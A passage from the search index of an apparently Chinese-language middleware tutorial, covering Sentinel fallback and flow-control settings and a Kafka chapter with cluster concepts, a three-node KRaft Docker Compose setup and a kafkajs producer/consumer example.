\u63a5\u53e3\u6765\u81ea\u5b9a\u4e49\u5f02\u5e38\u5904\u7406\u3002 public class CustomBlockExceptionHandler implements BlockExceptionHandler { @Override public void handle( HttpServletRequest request, HttpServletResponse response, String resouceName, BlockException e) throws Exception { response.setStatus(429); response.getWriter().write(\"Too many requests\"); } }","title":"Web \u63a5\u53e3\u9519\u8bef\u5904\u7406"},{"location":"26/#sentinelresource-fallback","text":"\u5bf9\u4e8e SentinelResouce \u7684 Fallback\uff0c\u53ef\u4ee5\u901a\u8fc7 fallback \u5c5e\u6027\u6765\u6307\u5b9a Fallback \u65b9\u6cd5\u3002\u6ce8\u610f\uff0c\u8fd8\u6709\u4e00\u4e2a\u53c2\u6570 blockHandler \uff0c\u5b83\u7684\u529f\u80fd\u4e0e fallback \u7c7b\u4f3c\uff0c\u4f46\u662f\u5b83\u66f4\u4f18\u5148\u3002 @SentinelResource(value = \"hello\", fallback = \"fallback\", blockHandler = \"blockHandler\") public String hello() { return \"Hello\"; } public String fallback(Throwable e) { return \"Fallback\"; } public String blockHandler(BlockException e) { return \"BlockHandler\"; } Fallback \u6216 BlockHandler \u7684\u51fd\u6570\u53c2\u6570\u6bd4\u539f\u672c\u7684\u51fd\u6570\u591a\u4e00\u4e2a\u53c2\u6570\uff0c\u5373\u5bf9\u5e94\u7684 Exception\u3002 \u5f53\u4e00\u4e2a\u5f02\u5e38\u88ab\u629b\u51fa\uff0c\u5982\u679c\u662f BlockException\uff0c\u5373 Sentinel \u89e6\u53d1\uff0c\u90a3\u4e48\u4f1a\u8c03\u7528 BlockHandler\uff0c\u5982\u679c\u6ca1\u6709 BlockHandler\uff0c\u90a3\u4e48\u4f1a\u8c03\u7528 Fallback\u3002\u5982\u679c\u6ca1\u6709 Fallback\uff0c\u90a3\u4e48\u4f1a\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u5230 Spring \u5168\u5c40\u5f02\u5e38\u5904\u7406\u5668\u3002 \u5982\u679c\u662f\u5176\u5b83\u7c7b\u578b\u7684\u5f02\u5e38\uff0c\u4f1a\u76f4\u63a5\u8d70 Fallback\u3002","title":"@SentinelResource Fallback"},{"location":"26/#openfeign-fallback","text":"OpenFeign Fallback \u8d70\u7684\u662f OpenFeign \u7684 Fallback \u8fd4\u56de\uff0c\u4f8b\u5982\uff0c package com.github.fingerbone; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; @FeignClient(value = \"app\", fallback = TestClientFallback.class) public interface TestClient { @GetMapping(\"/hello\") public String hello(); } package com.github.fingerbone; import org.springframework.stereotype.Component; @Component public class TestClientFallback implements TestClient { @Override public String hello() { return \"Fallback\"; } }","title":"OpenFeign Fallback"},{"location":"26/#sphu-try-catch","text":"\u6700\u540e\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528 SphU \u7684 try-catch \u65b9\u6cd5\u6765\u5904\u7406\u5f02\u5e38\u3002\u4e8b\u5b9e\u4e0a\uff0cSentinel \u4ee3\u7406\u4e86\u539f\u672c\u7684\u65b9\u6cd5\uff0c\u6bcf\u6b21\u8c03\u7528\u65f6\uff0c\u90fd\u4f1a\u4f7f\u7528 SphU \u7684 try-catch \u65b9\u6cd5\u6765\u5904\u7406\u5f02\u5e38\u3002 \u5373\u5bf9\u4e8e\u4e00\u4e2a\u53d7\u4fdd\u62a4\u7684\u51fd\u6570 func() \uff0c\u5b9e\u9645\u6267\u884c\u8fc7\u7a0b\u5982\u4e0b\uff0c try { SphU.entry(\"func\"); func(); } catch (BlockException e) { // Fallback }","title":"SphU try-catch"},{"location":"26/#sentinel_2","text":"\u4e0b\u9762\u4ecb\u7ecd Sentinel \u4e09\u79cd\u57fa\u7840\u4fdd\u62a4\u673a\u5236\u7684\u53c2\u6570\u3002 \u5bf9\u4e8e\u6d41\u91cf\u63a7\u5236\uff0c\u6709\uff0c \u6d41\u63a7\u6a21\u5f0f\u4e2d\uff0c\u76f4\u63a5\u6a21\u5f0f\u662f\u6307\u4e0d\u8003\u8651\u4efb\u4f55\u60c5\u51b5\uff0c\u53ea\u8981\u8bbf\u95ee\u8d44\u6e90\u7684\u6765\u6e90\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u5c31\u4f1a\u89e6\u53d1\u6d41\u63a7\u3002 \u94fe\u8def\u7b56\u7565\u6a21\u5f0f\u8981\u6307\u5b9a\u4e00\u4e2a\u5165\u53e3\u3002\u53ea\u6709\u6765\u81ea\u5165\u53e3\u7684\u6d41\u91cf\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u624d\u4f1a\u89e6\u53d1\u6d41\u63a7\u3002 \u4f7f\u7528\u94fe\u8def\u6a21\u5f0f\uff0c\u9700\u8981\u5c06 spring.cloud.sentinel.web-context-unify \u8bbe\u7f6e\u4e3a false \u3002\u5426\u5219\uff0cSentinel \u4e0d\u4f1a\u5c06\u4e0d\u540c WebEndpoint \u8c03\u7528\u7684\u540c\u4e00\u4e2a Service \u5206\u5217\u5f00\u3002 \u6700\u540e\u662f\u5173\u8054\u7b56\u7565\u3002\u5173\u8054\u7b56\u7565\u7684\u4f7f\u7528\u573a\u666f\u662f\u5199\u9891\u7e41\u65f6\u5bf9\u8bfb\u9650\u6d41\uff0c\u6ca1\u6709\u5199\u65f6\u5bf9\u8bfb\u4e0d\u9650\u6d41\u3002\u5173\u8054\u6a21\u5f0f\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u5173\u8054\u7684\u8d44\u6e90\uff0c\u53ea\u6709\u5173\u8054\u7684\u8d44\u6e90\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u81ea\u5df1\u4e5f\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u624d\u4f1a\u89e6\u53d1\u6d41\u63a7\u3002 \u6b64\u5916\u8fd8\u6709\u4e09\u79cd\u6d41\u63a7\u6548\u679c\uff0c \u5feb\u901f\u5931\u8d25\u6a21\u5f0f\u662f\u6307\u53ea\u8981\u89e6\u53d1\u6d41\u63a7\uff0c\u76f4\u63a5\u62d2\u7edd\u670d\u52a1\u3002 Warm Up \u6a21\u5f0f\u6709\u4e00\u4e2a\u989d\u5916\u7684 Period \u53c2\u6570\u3002\u5728 Period \u65f6\u95f4\u5185\uff0c\u6d41\u91cf\u9010\u6e10\u589e\u52a0\uff0c\u76f4\u5230\u8fbe\u5230\u9608\u503c\u3002\u589e\u52a0\u662f\u7ebf\u6027\u7684\uff0c\u51b7\u72b6\u6001\u662f QPS / Period \u4e2a\u8bf7\u6c42\uff0c\u4e4b\u540e\u79d2\u589e\u52a0\u5230 QPS \u4e2a\u8bf7\u6c42\u3002 \u6392\u961f\u7b49\u5f85\u6a21\u5f0f\u662f\u6307\u5f53\u6d41\u91cf\u8d85\u8fc7\u9608\u503c\u65f6\uff0c\u4e0d\u76f4\u63a5\u62d2\u7edd\u670d\u52a1\uff0c\u800c\u662f\u6392\u961f\u7b49\u5f85\u3002\u8fd9\u4e2a\u6a21\u5f0f\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u7b49\u5f85\u65f6\u95f4 timeout\uff0c\u5982\u679c\u7b49\u5f85\u65f6\u95f4\u8d85\u8fc7\u4e86\uff0c\u5c31\u4f1a\u62d2\u7edd\u670d\u52a1\u3002","title":"Sentinel \u6d41\u91cf\u63a7\u5236"},{"location":"26/#sentinel_3","text":"\u7194\u65ad\u7684\u4f5c\u7528\u662f\u5207\u65ad\u4e0d\u7a33\u5b9a\u7684\u8c03\u7528\u94fe\uff0c\u4f7f\u5f97\u67d0\u4e2a\u670d\u52a1\u5feb\u901f Fallback\uff0c\u4ee5\u907f\u514d\u670d\u52a1\u96ea\u5d29\u3002\u5426\u5728\uff0c\u5355\u4e2a\u670d\u52a1\u7684\u4e0d\u7a33\u5b9a\u53ef\u80fd\u4f1a\u88ab\u653e\u5927\u5bfc\u81f4\u6574\u4e2a\u7cfb\u7edf\u7684\u5d29\u6e83\u3002 \u7194\u65ad\u964d\u7ea7\u7528\u4e8e\u8fdc\u7a0b\u8c03\u7528\u90e8\u5206\uff0c\u8fd9\u91cc\u7684\u539f\u7406\u5df2\u7ecf\u5728 Resilience4j \u90e8\u5206\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u5173\u4e8e\u6162\u8c03\u7528\uff0c\u5f02\u5e38\u6bd4\u4f8b\uff0c\u5f02\u5e38\u6570\u7b49\u3002","title":"Sentinel \u7194\u65ad\u964d\u7ea7"},{"location":"26/#sentinel_4","text":"\u8fd9\u4e00\u529f\u80fd\u9002\u7528\u4e8e\u5bf9\u4e8e\u67d0\u4e2a\u8bbf\u95ee\u9891\u7e41\u7684\u53c2\u6570\uff0c\u4f8b\u5982\u5927\u5356\u7684\u67d0\u4e2a\u5546\u54c1 ID\uff0c\u5bf9\u4e8e\u8fd9\u4e2a\u5546\u54c1 ID \u7684\u8bbf\u95ee\u9891\u7387\u8d85\u8fc7\u4e86\u9608\u503c\uff0c\u5c31\u4f1a\u89e6\u53d1\u70ed\u70b9\u53c2\u6570\u9650\u6d41\u3002\u8fd9\u5c5e\u4e8e\u6d41\u91cf\u63a7\u5236\u7684\u66f4\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\uff0c\u53ef\u4ee5\u63a7\u5236\u53ea\u5bf9\u67d0\u4e2a\u53c2\u6570\u8fdb\u884c\u9650\u6d41\u3002","title":"Sentinel \u70ed\u70b9\u53c2\u6570\u9650\u6d41"},{"location":"27/","text":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch27 Kafka \u9ad8\u6027\u80fd\u6d88\u606f\u961f\u5217 \u8fd9\u91cc\u5b66\u4e60\u7684 Kafka \u4e0e\u4e4b\u524d\u5b66\u4e60\u7684 RabbitMQ \u7684\u533a\u522b\u662f\uff0cKafka \u5176\u5b9e\u66f4\u6ce8\u91cd\u7684\u662f\u6d41\u5f0f\u6570\u636e\uff0c\u9ad8\u541e\u5410\u7684\u6027\u80fd\u5904\u7406\uff0c\u800c RabbitMQ \u6027\u80fd\u6bd4 Kafka \u5dee\uff0c\u4f46\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u7279\u6027\u3002Kafka \u9002\u7528\u4e8e\u65e5\u5fd7\u6536\u96c6\u4e0e\u5904\u7406\u7b49\u573a\u666f\uff0c\u4e00\u822c\u53ea\u6709\u6570\u636e\u91cf\u8db3\u591f\u5927\u624d\u9700\u8981\u7528\u5230\u5b83\u3002 \u6ce8\u610f\uff0cKafka \u662f\u4e00\u79cd\u6301\u4e45\u5316\u7684\u8ba2\u9605-\u53d1\u5e03\u6a21\u5f0f\uff0c\u53ef\u4ee5\u7528\u4e8e\u5b58\u50a8\u6570\u636e\uff0c\u4e14\u5728\u6d88\u606f\u8f6c\u53d1\u540e\u4e0d\u4f1a\u4e22\u5f03\u3002 \u57fa\u672c\u6982\u5ff5 Broker\uff08\u4ee3\u7406\u8282\u70b9\uff09 \u8fd9\u662f Kafka \u96c6\u7fa4\u4e2d\u7684\u670d\u52a1\u5668\u8282\u70b9 \u6bcf\u4e2a broker \u8d1f\u8d23\u5b58\u50a8\u6570\u636e\u5e76\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42 \u591a\u4e2a broker \u7ec4\u6210\u4e00\u4e2a Kafka \u96c6\u7fa4 Controller\uff08\u63a7\u5236\u5668\uff09 \u662f\u4e00\u4e2a\u7279\u6b8a\u7684 broker\uff0c\u7531\u96c6\u7fa4\u9009\u4e3e\u4ea7\u751f \u8d1f\u8d23\u7ba1\u7406\u96c6\u7fa4\u72b6\u6001\uff0c\u5982\u5206\u533a\u5206\u914d\u3001leader \u9009\u4e3e\u7b49 \u4e00\u4e2a\u96c6\u7fa4\u53ea\u6709\u4e00\u4e2a controller Topic\uff08\u4e3b\u9898\uff09 \u662f\u6d88\u606f\u7684\u903b\u8f91\u5206\u7c7b \u76f8\u5f53\u4e8e\u4e00\u4e2a\u6d88\u606f\u961f\u5217\u6216\u9891\u9053 \u6bd4\u5982\u53ef\u4ee5\u6709\"\u8ba2\u5355\"\u3001\"\u652f\u4ed8\"\u7b49\u4e0d\u540c\u7684 topic Partition\uff08\u5206\u533a\uff09 \u6bcf\u4e2a topic \u53ef\u4ee5\u5206\u6210\u591a\u4e2a partition partition \u662f\u6570\u636e\u5b58\u50a8\u548c\u590d\u5236\u7684\u57fa\u672c\u5355\u4f4d \u4e0d\u540c partition \u53ef\u4ee5\u5206\u5e03\u5728\u4e0d\u540c broker \u4e0a\uff0c\u5b9e\u73b0\u8d1f\u8f7d\u5747\u8861 Message/Record\uff08\u6d88\u606f/\u8bb0\u5f55\uff09 \u8fd9\u662f Kafka \u4e2d\u6700\u57fa\u672c\u7684\u6570\u636e\u5355\u5143 \u5305\u542b key\u3001value\u3001timestamp \u7b49\u4fe1\u606f \u53d1\u9001\u5230 topic \u4e2d\u7684\u6bcf\u6761\u6570\u636e\u5c31\u662f\u4e00\u6761 message \u5b83\u4eec\u4e4b\u95f4\u7684\u5173\u7cfb\u662f\uff1a Kafka\u96c6\u7fa4 \u251c\u2500\u2500 \u591a\u4e2a Broker (\u5176\u4e2d\u4e00\u4e2a\u662f Controller) \u2514\u2500\u2500 \u591a\u4e2a Topic \u2514\u2500\u2500 \u591a\u4e2a Partition \u2514\u2500\u2500 \u591a\u6761 Message \u5047\u8bbe\u6709\u4e00\u4e2a\u7535\u5546\u7cfb\u7edf\uff0c\u53ef\u80fd\u4f1a\u6709\uff1a \"\u8ba2\u5355\" topic\uff1a\u5b58\u50a8\u8ba2\u5355\u76f8\u5173\u6d88\u606f \"\u652f\u4ed8\" topic\uff1a\u5b58\u50a8\u652f\u4ed8\u76f8\u5173\u6d88\u606f \u6bcf\u4e2a topic \u53ef\u80fd\u5206\u6210 3 \u4e2a partition\uff0c\u5206\u5e03\u5728\u4e0d\u540c broker \u4e0a\uff0c\u63d0\u9ad8\u5e76\u884c\u5904\u7406\u80fd\u529b\u3002 \u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e0b kafka \u7684\u67b6\u6784\u3002 \u57fa\u672c\u67b6\u6784 \u751f\u4ea7\u8005 -> Kafka\u96c6\u7fa4 -> \u6d88\u8d39\u8005 \u2193 ZooKeeper/KRaft \u6838\u5fc3\u7ec4\u4ef6\u548c\u804c\u8d23\uff1a Producer\uff08\u751f\u4ea7\u8005\uff09 \u8d1f\u8d23\u53d1\u9001\u6d88\u606f\u5230 Kafka \u96c6\u7fa4 \u53ef\u4ee5\u6307\u5b9a\u5206\u533a\u7b56\u7565\uff08\u8f6e\u8be2\u3001hash\u7b49\uff09 \u652f\u6301\u540c\u6b65\u6216\u5f02\u6b65\u53d1\u9001 Consumer\uff08\u6d88\u8d39\u8005\uff09 \u4ece Kafka \u96c6\u7fa4\u8bfb\u53d6\u6d88\u606f \u53ef\u4ee5\u7ec4\u6210 Consumer Group \u8fdb\u884c\u6d88\u8d39 \u6bcf\u4e2a\u5206\u533a\u53ea\u80fd\u88ab\u540c\u4e00\u7ec4\u5185\u7684\u4e00\u4e2a\u6d88\u8d39\u8005\u6d88\u8d39 Consumer Group\uff08\u6d88\u8d39\u8005\u7ec4\uff09 \u591a\u4e2a\u6d88\u8d39\u8005\u7ec4\u6210\u4e00\u7ec4 \u5b9e\u73b0\u6d88\u606f\u7684\u5e76\u884c\u6d88\u8d39 \u63d0\u4f9b\u6545\u969c\u8f6c\u79fb\u80fd\u529b \u9ad8\u53ef\u7528\u673a\u5236\uff1a \u526f\u672c\u673a\u5236\uff0c\u4f7f\u7528\u4e00\u4e3b\u591a\u5907\u673a\u5236\u3002 \u6bcf\u4e2a\u5206\u533a\u6709\u591a\u4e2a\u526f\u672c\uff08replica\uff09 \u4e00\u4e2a leader \u526f\u672c\u548c\u591a\u4e2a follower \u526f\u672c follower \u4ece leader \u540c\u6b65\u6570\u636e \u5f53 leader \u6545\u969c\u65f6\uff0c\u4ece follower \u4e2d\u9009\u4e3e\u65b0\u7684 leader \u793a\u4f8b\u67b6\u6784\uff1a Producer\u5c42 \u2193 Broker\u96c6\u7fa4 \u251c\u2500\u2500 Broker1 (Controller) \u2502 \u2514\u2500\u2500 Partition1-Leader \u2502 \u2514\u2500\u2500 Partition2-Follower \u251c\u2500\u2500 Broker2 \u2502 \u2514\u2500\u2500 Partition1-Follower \u2502 \u2514\u2500\u2500 Partition2-Leader \u251c\u2500\u2500 Broker3 \u2502 \u2514\u2500\u2500 Partition1-Follower \u2502 \u2514\u2500\u2500 Partition2-Follower \u2193 Consumer Group\u5c42 \u5173\u952e\u7279\u6027\uff1a \u5206\u533a\u63d0\u4f9b\u5e76\u884c\u5904\u7406\u80fd\u529b \u526f\u672c\u63d0\u4f9b\u9ad8\u53ef\u7528\u6027 Consumer Group \u63d0\u4f9b\u6269\u5c55\u6027 Controller \u63d0\u4f9b\u96c6\u4e2d\u5f0f\u7ba1\u7406 \u652f\u6301\u6c34\u5e73\u6269\u5c55 \u8fd9\u79cd\u67b6\u6784\u8bbe\u8ba1\u4f7f Kafka\uff1a \u5177\u6709\u9ad8\u541e\u5410\u91cf \u53ef\u9760\u6027\u5f3a \u5bb9\u9519\u6027\u597d \u6613\u4e8e\u6269\u5c55 \u542f\u52a8 Kafka \u6ce8\u610f\uff0c\u5728\u4ee5\u524d\u7248\u672c\uff0cKafka \u9700\u8981\u642d\u914d Zookeeper\u3002\u4f46\u662f\u73b0\u5728 Kraft \u662f\u66f4\u63a8\u8350\u7684\u673a\u5236\u3002 \u8fd9\u91cc\u76f4\u63a5\u4f7f\u7528 Docker \u542f\u52a8\u4e00\u4e2a Kafka \u96c6\u7fa4\u3002 docker pull apache/kafka-native:3.9.0 docker run -p 9092:9092 apache/kafka-native:3.9.0 \u4f7f\u7528 native \u7248\u672c\u7684\u955c\u50cf\u6027\u80fd\u66f4\u597d\uff0c\u4e0d\u8fc7\u5728\u6211\u4eec\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\u8fd9\u4e0d\u91cd\u8981\u3002 Kafka \u7684\u914d\u7f6e\u6587\u4ef6\u5728 Container \u7684 /opt/kafka/config \u4e2d\uff0c\u4e5f\u53ef\u4ee5\u5728\u542f\u52a8 Container \u65f6\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u914d\u7f6e\u3002 \u4e0a\u9762\u8fd9\u6837\u53ea\u542f\u52a8\u4e86\u4e00\u4e2a\u5bb9\u5668\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e2a\u96c6\u7fa4\u7684 Docker Compose\uff0c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u8bf7\u4f7f\u7528 k8s \u6216 ansible \u642d\u5efa\u96c6\u7fa4\u3002 version: '3.8' networks: kafka-net: driver: bridge services: kafka1: image: confluentinc/cp-kafka:7.6.0 hostname: kafka1 container_name: kafka1 networks: - kafka-net ports: - \"19092:19092\" # External access environment: KAFKA_KRAFT_MODE: \"true\" KAFKA_PROCESS_ROLES: \"controller,broker\" KAFKA_NODE_ID: 1 KAFKA_CONTROLLER_QUORUM_VOTERS: \"1@kafka1:9093,2@kafka2:9093,3@kafka3:9093\" KAFKA_LISTENERS: \"CONTROLLER://0.0.0.0:9093,INTERNAL://0.0.0.0:9092,EXTERNAL://0.0.0.0:19092\" KAFKA_ADVERTISED_LISTENERS: \"INTERNAL://kafka1:9092,EXTERNAL://localhost:19092\" KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: \"CONTROLLER:PLAINTEXT,INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT\" KAFKA_CONTROLLER_LISTENER_NAMES: \"CONTROLLER\" KAFKA_INTER_BROKER_LISTENER_NAME: \"INTERNAL\" CLUSTER_ID: \"m1Ze6AjGRwqarkcxJscgyQ\" KAFKA_LOG_DIRS: \"/var/lib/kafka/data\" volumes: - ./kafka1/data:/var/lib/kafka/data kafka2: image: confluentinc/cp-kafka:7.6.0 hostname: kafka2 container_name: kafka2 networks: - kafka-net ports: - \"19093:19093\" environment: KAFKA_KRAFT_MODE: \"true\" KAFKA_PROCESS_ROLES: \"controller,broker\" KAFKA_NODE_ID: 2 KAFKA_CONTROLLER_QUORUM_VOTERS: \"1@kafka1:9093,2@kafka2:9093,3@kafka3:9093\" KAFKA_LISTENERS: \"CONTROLLER://0.0.0.0:9093,INTERNAL://0.0.0.0:9092,EXTERNAL://0.0.0.0:19093\" KAFKA_ADVERTISED_LISTENERS: \"INTERNAL://kafka2:9092,EXTERNAL://localhost:19093\" KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: \"CONTROLLER:PLAINTEXT,INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT\" KAFKA_CONTROLLER_LISTENER_NAMES: \"CONTROLLER\" KAFKA_INTER_BROKER_LISTENER_NAME: \"INTERNAL\" CLUSTER_ID: \"m1Ze6AjGRwqarkcxJscgyQ\" KAFKA_LOG_DIRS: \"/var/lib/kafka/data\" volumes: - ./kafka2/data:/var/lib/kafka/data kafka3: image: confluentinc/cp-kafka:7.6.0 hostname: kafka3 container_name: kafka3 networks: - kafka-net ports: - \"19094:19094\" environment: KAFKA_KRAFT_MODE: \"true\" KAFKA_PROCESS_ROLES: \"controller,broker\" KAFKA_NODE_ID: 3 KAFKA_CONTROLLER_QUORUM_VOTERS: \"1@kafka1:9093,2@kafka2:9093,3@kafka3:9093\" KAFKA_LISTENERS: \"CONTROLLER://0.0.0.0:9093,INTERNAL://0.0.0.0:9092,EXTERNAL://0.0.0.0:19094\" KAFKA_ADVERTISED_LISTENERS: \"INTERNAL://kafka3:9092,EXTERNAL://localhost:19094\" KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: \"CONTROLLER:PLAINTEXT,INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT\" KAFKA_CONTROLLER_LISTENER_NAMES: \"CONTROLLER\" KAFKA_INTER_BROKER_LISTENER_NAME: \"INTERNAL\" CLUSTER_ID: \"m1Ze6AjGRwqarkcxJscgyQ\" KAFKA_LOG_DIRS: \"/var/lib/kafka/data\" volumes: - ./kafka3/data:/var/lib/kafka/data \u8fd9\u91cc\u7684\u914d\u7f6e\u9700\u8981\u6ce8\u610f\uff0c\u6bd4\u8f83\u590d\u6742\uff0c \u8fd9\u91cc\u7684\u914d\u7f6e\u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u51e0\u70b9\uff1a KAFKA_KRAFT_MODE \uff1a\u8bbe\u7f6e\u4e3a true \u8868\u793a\u542f\u7528\u4e86Kafka\u7684KRaft\u6a21\u5f0f\uff0c\u5373\u4e0d\u4f9d\u8d56Zookeeper\u3002\u8fd9\u662fKafka\u7684\u65b0\u7279\u6027\uff0c\u63a8\u8350\u5728\u65b0\u7248\u672c\u4e2d\u4f7f\u7528\u3002 KAFKA_PROCESS_ROLES \uff1a\u6307\u5b9a\u6bcf\u4e2aKafka\u8282\u70b9\u7684\u89d2\u8272\u3002\u5728\u6b64\u914d\u7f6e\u4e2d\uff0c\u6bcf\u4e2a\u8282\u70b9\u90fd\u540c\u65f6\u4f5c\u4e3a\u63a7\u5236\u5668\u548c\u4ee3\u7406\uff08 controller,broker \uff09\u3002\u8fd9\u5141\u8bb8Kafka\u96c6\u7fa4\u5728\u6ca1\u6709\u72ec\u7acb\u63a7\u5236\u5668\u8282\u70b9\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u3002 KAFKA_NODE_ID \uff1a\u4e3a\u6bcf\u4e2a\u8282\u70b9\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684ID\u3002\u8fd9\u91cc\u5206\u522b\u4e3a1\u30012\u548c3\uff0c\u5206\u522b\u4ee3\u8868\u4e09\u4e2aKafka\u8282\u70b9\u3002 KAFKA_CONTROLLER_QUORUM_VOTERS \uff1a\u914d\u7f6e\u96c6\u7fa4\u4e2d\u63a7\u5236\u5668\u7684\u9009\u4e3e\u6210\u5458\uff0c\u8fd9\u91cc\u5305\u62ec\u6240\u6709\u4e09\u4e2a\u8282\u70b9\u3002\u63a7\u5236\u5668\u8d1f\u8d23\u7ba1\u7406Kafka\u96c6\u7fa4\u7684\u5143\u6570\u636e\u548c\u534f\u8c03\u5de5\u4f5c\u3002 KAFKA_LISTENERS \u548c KAFKA_ADVERTISED_LISTENERS \uff1a\u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\u7528\u4e8e\u6307\u5b9aKafka\u8282\u70b9\u7684\u76d1\u542c\u5730\u5740\u548c\u5e7f\u544a\u5730\u5740\u3002 INTERNAL \u7528\u4e8e\u96c6\u7fa4\u5185\u90e8\u901a\u4fe1\uff0c EXTERNAL \u5219\u7528\u4e8e\u5916\u90e8\u8bbf\u95ee\u3002 KAFKA_LOG_DIRS \uff1a\u6307\u5b9aKafka\u6570\u636e\u5b58\u50a8\u7684\u8def\u5f84\u3002\u6bcf\u4e2a\u8282\u70b9\u90fd\u9700\u8981\u4e00\u4e2a\u5355\u72ec\u7684\u5377\u6765\u5b58\u50a8\u5176\u65e5\u5fd7\u6570\u636e\u3002 KAFKA_LISTENER_SECURITY_PROTOCOL_MAP \uff1a\u8fd9\u662f\u7528\u6765\u6307\u5b9a\u4e0d\u540c\u76d1\u542c\u5668\u534f\u8bae\u7684\u6620\u5c04\u3002\u5728\u8fd9\u4e2a\u914d\u7f6e\u4e2d\uff0c CONTROLLER \u3001 INTERNAL \u3001 EXTERNAL \u4e09\u4e2a\u534f\u8bae\u90fd\u8bbe\u7f6e\u4e3a PLAINTEXT \u3002\u8fd9\u610f\u5473\u7740\u901a\u4fe1\u4e0d\u52a0\u5bc6\u3002\u5982\u679c\u9700\u8981\u66f4\u5b89\u5168\u7684\u901a\u4fe1\uff0c\u53ef\u4ee5\u9009\u62e9 SSL \u6216 SASL \u7b49\u534f\u8bae\u3002 KAFKA_CONTROLLER_LISTENER_NAMES \uff1a\u7528\u4e8e\u6307\u5b9a\u63a7\u5236\u5668\u76d1\u542c\u5668\u7684\u540d\u79f0\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u63a7\u5236\u5668\u76d1\u542c\u5668\u7684\u540d\u79f0\u662f CONTROLLER \uff0c\u5b83\u4f1a\u4e0e KAFKA_LISTENERS \u4e2d\u7684 CONTROLLER \u534f\u8bae\u914d\u5bf9\u3002 KAFKA_INTER_BROKER_LISTENER_NAME \uff1a\u6307\u5b9a\u96c6\u7fa4\u4e2d\u8282\u70b9\u4e4b\u95f4\uff08\u5373\u4ee3\u7406\u4e4b\u95f4\uff09\u901a\u4fe1\u4f7f\u7528\u7684\u76d1\u542c\u5668\u540d\u79f0\u3002\u8fd9\u91cc\u8bbe\u7f6e\u4e3a INTERNAL \uff0c\u610f\u5473\u7740\u5185\u90e8\u7684\u8282\u70b9\u95f4\u901a\u4fe1\u4f1a\u4f7f\u7528 INTERNAL \u534f\u8bae\u3002 CLUSTER_ID \uff1a\u8fd9\u662f\u96c6\u7fa4\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u5728\u542f\u7528KRaft\u6a21\u5f0f\u65f6\uff0cKafka\u9700\u8981\u4e00\u4e2a CLUSTER_ID \u6765\u533a\u5206\u4e0d\u540c\u7684\u96c6\u7fa4\u3002\u786e\u4fdd\u5728\u6240\u6709\u8282\u70b9\u4e0a\u4f7f\u7528\u76f8\u540c\u7684 CLUSTER_ID \u3002\u8fd9\u91cc\u5fc5\u987b\u662f\u4e00\u4e2a base64 UUID\uff0c\u968f\u673a\u751f\u6210\u4e00\u4e2a\u5373\u53ef\u3002 KAFKA_LOG_DIRS \uff1a\u6307\u5b9aKafka\u65e5\u5fd7\u7684\u5b58\u50a8\u4f4d\u7f6e\u3002\u6bcf\u4e2aKafka\u5bb9\u5668\u90fd\u9700\u8981\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u4ee5\u907f\u514d\u6570\u636e\u4e22\u5931\u3002\u901a\u5e38\u4f1a\u5c06\u5bb9\u5668\u7684\u5b58\u50a8\u76ee\u5f55\u6620\u5c04\u5230\u672c\u5730\u7684\u67d0\u4e2a\u8def\u5f84\uff0c\u6bd4\u5982 ./kafka1/data \u3001 ./kafka2/data \u7b49\u3002 \u64cd\u7eb5 Kafka \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 NodeJS \u64cd\u7eb5 Kafka \u96c6\u7fa4\u3002\u5f53\u7136\uff0c\u5355\u673a NodeJS \u5904\u7406\u53ef\u80fd\u6027\u80fd\u4e0d\u591f\uff0c\u4f46\u662f\u5728\u5fae\u670d\u52a1\u573a\u666f\u4e0b\uff0c\u56e0\u4e3a\u670d\u52a1\u53ef\u4ee5\u81ea\u7531\u4f38\u7f29\uff0c\u56e0\u6b64\u5355\u673a\u7684\u6027\u80fd\u53cd\u800c\u4e0d\u662f\u5f88\u91cd\u8981\u4e86\u3002 const { Kafka } = require('kafkajs'); // \u57fa\u7840\u914d\u7f6e const kafka = new Kafka({ clientId: 'simple-client', brokers: ['localhost:19092', 'localhost:19093', 'localhost:19094'], connectionTimeout: 10000, retry: { retries: 10 } }); async function main() { // \u751f\u4ea7\u8005 const producer = kafka.producer(); await producer.connect(); await producer.send({ topic: 'simple-topic', messages: [{ value: 'Test Message' }], acks: -1 }); console.log('\u6d88\u606f\u53d1\u9001\u6210\u529f'); // \u6d88\u8d39\u8005\uff08\u89e3\u51b3\u534f\u8c03\u5668\u95ee\u9898\u5173\u952e\u914d\u7f6e\uff09 const consumer = kafka.consumer({ groupId: 'simple-group', sessionTimeout: 30000, retry: { retries: 15 } }); await consumer.connect(); await consumer.subscribe({ topic: 'simple-topic', fromBeginning: true }); consumer.run({ eachMessage: async ({ message }) => { console.log(`\u6536\u5230\u6d88\u606f: ${message.value}`); } }); // \u4fdd\u6301\u8fd0\u884c30\u79d2 await new Promise(resolve => 